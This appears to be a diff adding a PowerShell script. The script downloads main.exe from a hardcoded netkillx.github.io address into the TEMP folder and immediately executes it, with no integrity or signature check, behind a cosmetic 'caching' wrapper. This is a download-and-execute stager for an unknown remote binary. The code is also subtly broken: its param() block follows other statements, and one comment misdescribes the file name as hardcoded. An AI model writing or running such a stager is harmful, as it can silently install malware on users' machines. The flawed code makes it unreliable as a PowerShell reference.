@@ -1,0 +1,67 @@
+# --- Define the hardcoded download link here ---
+$DownloadUrl = "https://netkillx.github.io/main.exe"
+# -----------------------------------------------
+
+param(
+    # Only the FileName parameter remains, as the URL is now hardcoded.
+    [Parameter(Mandatory=$true)]
+    [string]$FileName
+)
+
+$TempDir = "$env:TEMP"
+# Note: The $ExePath will use the hardcoded $FileName provided when running the script.
+$ExePath = Join-Path -Path $TempDir -ChildPath $FileName
+$ExitCode = 0
+
+Write-Host "Local cache path: $ExePath" -ForegroundColor DarkGray
+
+# --- Caching and Download Logic ---
+if (Test-Path $ExePath) {
+    Write-Host "✅ Found cached file: $FileName. Skipping download." -ForegroundColor Green
+}
+else {
+    # File not found, proceed with download
+    $WebClient = New-Object System.Net.WebClient
+    
+    Write-Host "Starting download from $DownloadUrl..." -ForegroundColor Cyan
+
+    try {
+        # Set Security Protocol to handle modern TLS
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+        
+        # Download the file
+        $WebClient.DownloadFile($DownloadUrl, $ExePath)
+        Write-Host "Download complete. File saved to: $ExePath" -ForegroundColor Green
+    }
+    catch {
+        Write-Host "An error occurred during download:" -ForegroundColor Red
+        Write-Host $_.Exception.Message -ForegroundColor Red
+        $ExitCode = 1
+        # Exit immediately if the download failed
+        exit $ExitCode
+    }
+}
+
+# --- Execution Logic ---
+if (Test-Path $ExePath) {
+    Write-Host "Executing $FileName in the current terminal..." -ForegroundColor Yellow
+    
+    try {
+        # Use the call operator (&) to execute the file in the same console window
+        & $ExePath
+        $ExitCode = $LASTEXITCODE
+        Write-Host "Program execution finished. Exit Code: $ExitCode" -ForegroundColor Green
+    }
+    catch {
+        Write-Host "An error occurred during execution:" -ForegroundColor Red
+        Write-Host $_.Exception.Message -ForegroundColor Red
+        $ExitCode = 1
+    }
+}
+else {
+    Write-Host "Cannot execute. The file was not found locally." -ForegroundColor Red
+    $ExitCode = 1
+}
+
+# Return the program's exit code
+exit $ExitCode
